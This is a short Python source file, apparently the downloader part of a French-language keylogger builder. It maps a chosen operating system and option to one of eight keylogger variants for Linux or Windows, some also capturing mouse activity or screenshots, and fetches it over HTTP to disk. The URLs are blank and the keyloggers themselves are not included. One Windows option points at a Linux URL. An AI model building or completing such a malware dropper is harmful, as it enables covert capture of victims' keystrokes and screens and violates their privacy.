import requests


urlLinuxKeylogger = ""
filename = "keyloggerLinux.py"
urlLinuxKeyloggerMouse = ""
filename2 = "keyloggerLinuxAvecMouse.py"
urlLinuxKeyloggerScreen = ""
filename3 = "keyloggerLinuxAvecScreen.py"
urlLinuxKeyloggerMouseScreen = ""
filename4 = "keyloggerLinuxAvecScreenEtMouse.py"
urlWindowsKeylogger = ""
filename5 = "keyloggerWindows.py"
urlWindowsKeyloggerMouse = ""
filename6 = "keyloggerWindowsAvecMouse.py"
urlWindowsKeyloggerScreen = ""
filename7 = "keyloggerWindowsAvecScreen.py"
urlWindowsKeyloggerMouseScreen = ""
filename8 = "keyloggerWindowsAvecScreenEtMouse.py"

def downloadFileCompile(os_system, choice):
    if os_system==1:
        if choice=='1':
            download(urlLinuxKeylogger, filename)
        elif choice=='2':
            download(urlLinuxKeyloggerMouse, filename2)
        elif choice=='3':
            download(urlLinuxKeyloggerScreen, filename3)
        elif choice=='4':
            download(urlLinuxKeyloggerMouseScreen, filename4)

    if os_system == 2:
        if choice == '1':
            download(urlWindowsKeylogger, filename5)
        elif choice == '2':
            download(urlWindowsKeyloggerMouse, filename6)
        elif choice == '3':
            download(urlLinuxKeyloggerScreen, filename7)
        elif choice == '4':
            download(urlWindowsKeyloggerMouseScreen, filename8)




def download(url, filename):
    response = requests.get(url)
    if response.status_code==200:
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(response.text)

        print(f'Le fichier {filename} a été téléchargé avec succès.')